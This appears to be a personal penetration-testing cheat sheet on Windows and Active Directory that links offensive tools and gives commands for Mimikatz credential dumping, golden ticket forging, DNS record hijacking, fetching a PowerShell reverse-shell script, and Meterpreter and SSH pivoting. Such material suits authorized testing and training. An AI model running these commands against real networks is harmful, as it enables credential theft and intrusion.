# Windwos and Active Directory cheat sheet

# Table of content
- [Active Directory](#Active-Directory)
- [cheat sheets and resources](#cheat-sheets-and-resources)
- [tools](#tools)
  - [PowerView/SharpView](#PowerViewSharpView)
  - [BloodHound](#BloodHound)
  - [SharpHound](#SharpHound)
  - [BloodHound-py](#BloodHound-py)
  - [AD Kerbrute](#AD-Kerbrute)
  - [Impacket toolkit](#Impacket-toolkit)
  - [AD Responder](#AD-Responder)
  - [Inveigh-ps1](#Inveigh-ps1)
  - [C-plus Inveigh InveighZero](#C-plus-Inveigh-InveighZero)
  - [CrackMapExec CME](#CrackMapExec-CME)
  - [Rubeus](#Rubeus)
  - [GetUserSPNs-py](#GetUserSPNs-py)
  - [AD enum4linux](#AD-enum4linux)
  - [enum4linux ng](#enum4linux-ng)
  - [ldapsearch](#ldapsearch)
  - [windapsearch](#windapsearch)
  - [DomainPasswordSpray-ps1](#DomainPasswordSpray-ps1)
  - [LAPSToolkit](#LAPSToolkit)
  - [AD smbmap](#AD-smbmap)
  - [psexec-py](#psexec-py)
  - [wmiexec-py](#wmiexec-py)
  - [Snaffler](#Snaffler)
  - [smbserver-py](#smbserver-py)
  - [setspn exe](#setspn-exe)
  - [Mimikatz](#Mimikatz)
  - [kekeo](#kekeo)
  - [secretsdump-py](#secretsdump-py)
  - [AD evil winrm](#AD-evil-winrm)
  - [mssqlclient-py](#mssqlclient-py)
  - [noPac py](#noPac-py)
  - [rpcdump-py](#rpcdump-py)
  - [CVE 2021 1675-py](#CVE-2021-1675-py)
  - [ntlmrelayx-py](#ntlmrelayx-py)
  - [PetitPotam-py](#PetitPotam-py)
  - [gettgtpkinit-py](#gettgtpkinit-py)
  - [getnthash-py](#getnthash-py)
  - [adidnsdump](#adidnsdump)
  - [gpp-decrypt](#gpp-decrypt)
  - [GetNPUsers-py](#GetNPUsers-py)
  - [lookupsid-py](#lookupsid-py)
  - [ticketer-py](#ticketer-py)
  - [raiseChild-py](#raiseChild-py)
  - [Active Directory Explorer](#Active-Directory-Explorer)
  - [PingCastle](#PingCastle)
  - [Group3r](#Group3r)
  - [ADRecon](#ADRecon)
  - [tcpdump](#tcpdump)
  - [net creds](#net-creds)
  - [NetMiner](#NetMiner)
  - [Fping](#Fping)
  - [linkedin2username](#linkedin2username)
  - [SharpGPOAbuse](#SharpGPOAbuse)
  - [nsupdate](#nsupdate)
  - [openssl](#openssl)
  - [mslink](#mslink)
  - [Invoke PowerShellTcp ps1](#Invoke-PowerShellTcp-ps1)
  - [nishang](#nishang)
- [Pivoting Tunneling and Port Forwarding](#Pivoting-Tunneling-and-Port-Forwarding)
  - [Meterpreter Tunneling and Port Forwarding](#Meterpreter-Tunneling-and-Port-Forwarding)
  - [sshuttle](#sshuttle)
  - [chisel](#chisel)
  - [Dynamic Port Forwarding with SSH and SOCKS Tunneling](#Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling)
  - [Remote-Reverse Port Forwarding with SSH](#Remote-Reverse-Port-Forwarding-with-SSH)
  - [Socat Redirection with a Reverse Shell](#Socat-Redirection-with-a-Reverse-Shell)
  - [Socat Redirection with a Bind Shell](#Socat-Redirection-with-a-Bind-Shell)
  - [SSH for Windows plink exe](#SSH-for-Windows-plink-exe)
  - [SSH Pivoting with Sshuttle](#SSH-Pivoting-with-Sshuttle)
  - [Web Server Pivoting with Rpivot](#Web-Server-Pivoting-with-Rpivot)
- [Privilige Escalation](#Privilige-Escalation)
  - [seatbelt](#seatbelt)
  - [winpeas](#winpeas)
  - [sweetpotato](#sweetpotato)
  - [JuicyPotato](#JuicyPotato)
  - [hotpotato](#hotpotato)
  - [rottenpotato](#rottenpotato)
  - [lonelypotato](#lonelypotato)
  - [roguepotato](#roguepotato)
  - [genericpotato](#genericpotato)
  - [printnightmare](#printnightmare)




# Active Directory 

## cheat sheets/resources

### cheat sheets and resources
```
https://github.com/cube0x0/Security-Assessment
```
```
https://adsecurity.org/?p=1001
```
```
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
```
```
https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
```
```
https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
```
```
https://adepts.of0x.cc/shadowmove-hijack-socket/
```

## tools

### PowerView/SharpView
A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting.
```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

```
https://github.com/dmchell/SharpView
```
### BloodHound
Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a Neo4j database for graphical analysis of the AD environment.
```
https://github.com/BloodHoundAD/BloodHound
```
### SharpHound

The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.

```
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
```
### BloodHound py

A Python-based BloodHound ingestor based on the Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.
```
https://github.com/fox-it/BloodHound.py
```
### AD Kerbrute
A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.

```
https://github.com/ropnop/kerbrute
```

### Impacket toolkit
A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.

```
https://github.com/SecureAuthCorp/impacket
```

### Responder
Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.

```
https://github.com/lgandx/Responder
```
### Inveigh ps1
Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.
```
https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1
```
```
https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters
```
example:
```
Import-Module .\Inveigh.ps1
```
```
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### C-plus Inveigh InveighZero
The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.

```
https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh
```
### rpcclient 
A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.

```
https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html
```

### CrackMapExec CME
CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.
```
https://github.com/byt3bl33d3r/CrackMapExec
```
videos and demos:
```
https://www.youtube.com/watch?v=I2ctzF1tZX8&ab_channel=HillbillyStorytime
```
### Rubeus 
Rubeus is a C# tool built for Kerberos Abuse.
```
https://github.com/GhostPack/Rubeus
```

### GetUserSPNs py
Another Impacket module geared towards finding Service Principal names tied to normal users.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
```

### AD enum4linux
A tool for enumerating information from Windows and Samba systems.
```
https://github.com/CiscoCXSecurity/enum4linux
```

### enum4linux ng
The tool enum4linux-ng is a rewrite of enum4linux in Python, but has additional features such as the ability to export data as YAML or JSON files which can later be used to process the data further or feed it to other tools. It also supports colored output, among other features
```
https://github.com/cddmp/enum4linux-ng
```

### ldapsearch
Built-in interface for interacting with the LDAP protocol.
```
https://linux.die.net/man/1/ldapsearch
```

### windapsearch
A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.

```
https://github.com/ropnop/windapsearch
```

### DomainPasswordSpray ps1
DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.
```
https://github.com/dafthack/DomainPasswordSpray
```

### LAPSToolkit
LAPSToolkit 	The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).
```
https://github.com/leoloobeek/LAPSToolkit
```

### AD smbmap
SMB share enumeration across a domain.

```
https://github.com/ShawnDEvans/smbmap
```
### psexec-py
Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
```

### wmiexec-py
Part of the Impacket toolkit, it provides the capability of command execution over WMI.

```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
```

### Snaffler
Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.

```
https://github.com/SnaffCon/Snaffler
```

### smbserver-py
Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.

```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
```

### setspn-exe
Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.

```
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
```

### Mimikatz
Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.

```
https://github.com/ParrotSec/mimikatz
```
```
https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz
```

example: dump hashes
```
privilege::debug
```
-- this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.
```
token::elevate
```
-- simply put, this takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges. This is something that we have a right to do as an administrator, but that is not usually possible using normal Windows operations.

There are a variety of commands we could use here, all of which do slightly different things. The command that we will use is: lsadump::sam.
When executed, this will provide us with a list of password hashes for every account on the machine (with some extra information thrown in as well). The Administrator account password hash should be fairly near the top of the list.

execute: 
```
lsadump::sam
```

lsadump::sam dumps the local Security Account Manager (SAM) NT hashes (cf. SAM secrets dump). It can operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM ). It has the following command line arguments: /sam : the offline backup of the SAM hive.


example 2:

lsadump::lsa
```
This is used to dump all local credentials on a Windows computer. LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly).


golden ticket example:
```
.\mimikatz.exe "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```


### kekeo
similar to mimikatz
```
https://github.com/gentilkiwi/kekeo
```


### secretsdump-py
Remotely dump SAM and LSA secrets from a host.

```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
```

### evil-winrm
Provides us with an interactive shell on a host over the WinRM protocol.


```
https://github.com/Hackplayers/evil-winrm

```

### mssqlclient-py
Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
```

### noPac-py
Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.
```
https://github.com/Ridter/noPac
```

### rpcdump-py
Part of the Impacket toolset, RPC endpoint mapper.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py
```

### CVE-2021-1675-py
Printnightmare PoC in python.
```
https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py
```

### ntlmrelayx-py
Part of the Impacket toolset, it performs SMB relay attacks.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
```

### PetitPotam-py
PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.
```
https://github.com/topotam/PetitPotam
```

### gettgtpkinit-py
Tool for manipulating certificates and TGTs.
```
https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
```

### getnthash-py
 	This tool will use an existing TGT to request a PAC for the current user using U2U.
```
https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
```

### adidnsdump
Active Directory Integrated DNS dumping by any authenticated user.
A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.
```
https://github.com/dirkjanm/adidnsdump
```

### gpp-decrypt
Extracts usernames and passwords from Group Policy preferences files.
```
https://github.com/t0thkr1s/gpp-decrypt
```

### GetNPUsers-py
Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
```

### lookupsid-py
SID bruteforcing tool.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py
```

### ticketer-py
A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
```

### raiseChild-py
Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py
```

### Active Directory Explorer
Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.
```
https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer
```

### PingCastle
Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on CMMI adapted to AD security).
```
https://www.pingcastle.com/documentation/
```

### Group3r
Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).
```
https://github.com/Group3r/Group3r
```

### ADRecon
A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.
```
https://github.com/adrecon/ADRecon
```

### tcpdump 
we can use tcodump to perform the same functions as wireshark. We can also use tcpdump to save a capture to a .pcap file, transfer it to another host, and open it in Wireshark.
```
https://linux.die.net/man/8/tcpdump
```

### net-creds
kinda like tcpdump
```
https://github.com/DanMcInerney/net-creds
```

### NetMiner
kinda like tcpdump
```
http://www.netminer.com/main/main-read.do
```

### Fping 
provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host. Where fping shines is in its ability to issue ICMP packets against a list of multiple hosts at once and its scriptability. Also, it works in a round-robin fashion, querying hosts in a cyclical manner instead of waiting for multiple requests to a single host to return before moving on. These checks will help us determine if anything else is active on the internal network. ICMP is not a one-stop-shop, but it is an easy way to get an initial idea of what exists. Other open ports and active protocols may point to new hosts for later targeting. 
```
https://fping.org/
```

### linkedin2username 
tool used to create a list of potentially valid users
```
https://github.com/initstring/linkedin2username
```
### SharpGPOAbuse
SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO. 

a tool such as SharpGPOAbuse to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.
```
https://github.com/FSecureLABS/SharpGPOAbuse
```

## nsupdate
nsupdate is used to submit Dynamic DNS Update requests as defined in RFC2136 to a name server. This allows resource records to be added or removed from a zone without manually editing the zone file. A single update request can contain requests to add or remove more than one resource record.

Zones that are under dynamic control via nsupdate or a DHCP server should not be edited by hand. Manual edits could conflict with dynamic updates and cause data to be lost. 

unsecured dynamic DNS updates gives any computer regardless of being joined to the domain or not, the ability to modify or create DNS records. 

As an example that we know we can update DNS records without our machine being joined to the domain we’ll use nsupdate. Let’s send a request to delete the existing A record for <ip/domain/etc> and then send an update add request for a new A record to have <service/etc> resolve to our <IP>.

```
nsupdate
```
```  
server <ip>
```
```
update delete <ip/domain/service/etc> 
```  
```  
send
```  
```
update add <same ip/domain/service/etc as you just removed> <port example 1234> A <your ip> 
```  
```  
send 
```  
```  
quit
```


  

## openssl
This package is part of the OpenSSL project’s implementation of the SSL and TLS cryptographic protocols for secure communication over the Internet.

It contains the general-purpose command line binary /usr/bin/openssl, useful for cryptographic operations such as:
creating RSA, DH, and DSA key parameters;
creating X.509 certificates, CSRs, and CRLs;
calculating message digests;
encrypting and decrypting with ciphers;
testing SSL/TLS clients and servers;
handling S/MIME signed or encrypted mail.

you can also create a public and private key with openssl using example and cert.pfx file

private key: 
```
openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes
```
public key:
```
openssl pkcs12 -in cert.pfx -out crt.pem -clcerts -nokeys
```
  
then use the certs to being able to use example responder to catch a request. But Before you start responder you’ll want to copy the two certs generated earlier to "/usr/share/responder/certs" or wherever "/certs" lives on your machine so copy them over there and then change the responder config in the https part.

from:
```
[HTTPS Server]

; Configure SSL Certificates to use
SSLCert = certs/responder.crt
SSLKey = certs/responder.key
```
to this for an example: 
```
[HTTPS Server]

; Configure SSL Certificates to use
SSLCert = certs/crt.pem
SSLKey = certs/key.pem
```  
  
you can also after this step, use those files to perform authentication via SSL using evil-winrm 

example: 
```
evil-winrm -S -c crt.pem -k key.pem -i 10.10.11.152
```
-c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
-k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
-S, --ssl                        Enable ssl

### mslink
This application allow you to create Windows Shortcut files (extension .LNK) without needing a Windows OS.
```
http://www.mamachine.org/mslink/index.en.html
```
### nishang
```
https://github.com/samratashok/nishang
```
Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.

 
### Invoke PowerShellTcp ps1
Invoke-PowerShellTcp.ps1 script coming from nishang:
```
https://github.com/samratashok/nishang
```
Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.
```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```
  


## Pivoting Tunneling and Port Forwarding
  
During a red team engagement, penetration test, or an Active Directory assessment, we will often find ourselves in a situation where we might have already compromised the required credentials, ssh keys, hashes, or access tokens to move onto another host, but there may be no other host directly reachable from our attack host. In such cases, we may need to use a pivot host that we have already compromised to find a way to our next target. One of the most important things to do when landing on a host for the first time is to check our privilege level, network connections, and potential VPN or other remote access software. If a host has more than one network adapter, we can likely use it to move to a different network segment. Pivoting is essentially the idea of moving to other networks through a compromised host to find more targets on different network segments.

There are many different terms used to describe a compromised host that we can use to pivot to a previously unreachable network segment. Some of the most common are:

    Pivot Host
    Proxy
    Foothold
    Beach Head system
    Jump Host

Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network. Tunneling, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it. Think of it like this:

We have a key we need to send to a partner, but we do not want anyone who sees our package to know it is a key. So we get a stuffed animal toy and hide the key inside with instructions about what it does. We then package the toy up and send it to our partner. Anyone who inspects the box will see a simple stuffed toy, not realizing it contains something else. Only our partner will know that the key is hidden inside and will learn how to access and use it once delivered.

Typical applications like VPNs or specialized browsers are just another form of tunneling network traffic.

We will inevitably come across several different terms used to describe the same thing in IT & the Infosec industry. With pivoting, we will notice that this is often referred to as Lateral Movement.

Isn't it the same thing as pivoting?

The answer to that is not exactly. Let's take a second to compare and contrast Lateral Movement with Pivoting and Tunneling, as there can be some confusion as to why some consider them different concepts.
  
### Lateral Movement, Pivoting, and Tunneling Compared
  
Lateral Movement

Lateral movement can be described as a technique used to further our access to additional hosts, applications, and services within a network environment. Lateral movement can also help us gain access to specific domain resources we may need to elevate our privileges. Lateral Movement often enables privilege escalation across hosts. In addition to the explanation we have provided for this concept, we can also study how other respected organizations explain Lateral Movement. Check out these two explanations when time permits:

Palo Alto Network's Explanation

MITRE's Explanation

One practical example of Lateral Movement would be:

During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account. We performed a network scan and found three more Windows hosts in the network. We attempted to use the same local administrator credentials, and one of those devices shared the same administrator account. We used the credentials to move laterally to that other device, enabling us to compromise the domain further. 

  
### Pivoting

Utilizing multiple hosts to cross network boundaries you would not usually have access to. This is more of a targeted objective. The goal here is to allow us to move deeper into a network by compromising targeted hosts or infrastructure.

One practical example of Pivoting would be:

During one tricky engagement, the target had their network physically and logically separated. This separation made it difficult for us to move around and complete our objectives. We had to search the network and compromise a host that turned out to be the engineering workstation used to maintain and monitor equipment in the operational environment, submit reports, and perform other administrative duties in the enterprise environment. That host turned out to be dual-homed (having more than one physical NIC connected to different networks). Without it having access to both enterprise and operational networks, we would not have been able to pivot as we needed to complete our assessment. 


### Tunneling

We often find ourselves using various protocols to shuttle traffic in/out of a network where there is a chance of our traffic being detected. For example, using HTTP to mask our Command & Control traffic from a server we own to the victim host. The key here is obfuscation of our actions to avoid detection for as long as possible. We utilize protocols with enhanced security measures such as HTTPS over TLS or SSH over other transport protocols. These types of actions also enable tactics like the exfiltration of data out of a target network or the delivery of more payloads and instructions into the network.

One practical example of Tunneling would be:

One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. This is a common way we maintained Command and Control (C2) of the hosts we had compromised within a network. We masked our instructions inside GET and POST requests that appeared as normal traffic and, to the untrained eye, would look like a web request or response to any old website. If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out.

To summarize, we should look at these tactics as separate things. Lateral Movement helps us spread wide within a network, elevating our privileges, while Pivoting allows us to delve deeper into the networks accessing previously unreachable environments. 

## Meterpreter Tunneling and Port Forwarding

Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port 8080.

We know that the Windows target (example) is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the ping_sweep module, which will generate the ICMP traffic from the Ubuntu host to the network 172.16.5.0/23.
example:
```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

We could also perform a ping sweep using a for loop directly on a target pivot host that will ping any device in the network range we specify. Here are two helpful ping sweep for loop one-liners we could use for Linux-based and Windows-based pivot hosts.

Ping Sweep For Loop on Linux Pivot Hosts
example:
```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
Ping Sweep For Loop Using CMD
example:
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

Ping Sweep Using PowerShell
example:
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built. 


There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
example:
```
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
```
Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

obs: in meterpreter on metasploit
example:
```
background 
use post/multi/manage/autoroute
set SESSION 1
set SUBNET  172.16.6.0
set NETMASK 24
run
```

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
example:
```
run autoroute -s 172.16.5.0/23
```

After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.
example:
```
run autoroute -p
```

We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.
example:
```
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

Port Forwarding
Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
```
help portfwd
```
```
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

Creating Local TCP Relay
example:
```
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
The above command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3300 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

Connecting to Windows Target through localhost
example:
```
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

Netstat Output
We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.
example:
```
netstat -antp
```

Meterpreter Reverse Port Forwarding

Similar to local port forwards, Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.

We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.
example:
```
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.


### sshuttle
Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin. Works with Linux and MacOS. Supports DNS tunneling.
```
https://github.com/sshuttle/sshuttle
```

### chisel
A fast TCP/UDP tunnel over HTTP 
```
https://github.com/jpillora/chisel
```

### Dynamic Port Forwarding with SSH and SOCKS Tunneling
we can port forward it to our localhost on port 1234 and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port 3306. So, we will use the below command to forward our local port (1234) over SSH to the Ubuntu server.
```
ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
```
The -L command tells the SSH client to request the SSH server to forward all the data we send via the port 1234 to localhost:3306 on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234. We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.
  
Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the local port:server:port argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on 8080.
```
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
```

we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (172.16.5.1-200) network or the entire subnet (172.16.5.0/23). We cannot perform this scan directly from our attack host because it does not have routes to the 172.16.5.0/23 network. To do this, we will have to perform dynamic port forwarding and pivot our network packets via the Ubuntu server. We can do this by starting a SOCKS listener on our local host (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.

This is called SSH tunneling over SOCKS proxy. SOCKS stands for Socket Secure, a protocol that helps communicate with servers where you have firewall restrictions in place. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.

This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from NAT networks. SOCKS proxies are currently of two types: SOCKS4 and SOCKS5. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that. 
```
ssh -D 9050 ubuntu@10.129.202.64
```

The -D argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port 9050. We can do this using the tool proxychains, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies.

To inform proxychains that we must use port 1080/9050, we must modify the proxychains configuration file located at /etc/proxychains.conf. We can add socks4 127.0.0.1 1080/9050 to the last line if it is not already there.

Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 1080/9050, where our SSH client is listening, which will forward all the packets over SSH to the x.x.x.x./23 network.

